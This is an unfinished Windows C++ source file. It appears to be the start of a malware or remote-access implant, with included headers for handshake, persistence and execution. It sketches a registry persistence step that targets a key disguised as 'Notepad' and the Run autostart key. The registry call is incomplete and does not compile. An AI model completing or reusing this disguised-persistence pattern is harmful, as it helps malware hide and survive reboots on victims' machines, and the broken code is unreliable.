    
#include <iostream>
#include <windows.h>

#include <lmcons.h> // GetUserName UNLEN
#include <direct.h> // _getcwd
//#include <stdlib.h>

#include "../inc/HandShake.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

using namespace  std;    

int main()
{
    string token;
    LONG status_open_key;
    bool a_is_admin = true;

    if(a_is_admin) //test if admin
    {
        //test if key exist
        status_open_key = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Notepad",  ) // RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        //open key
        //set key
    }
    else
    {
        
    }
    //source:
    /*
    
    1- https://www.itprotoday.com/windows-78/whats-wow6432node-under-hkeylocalmachinesoftware-registry-subkey
    

    */
}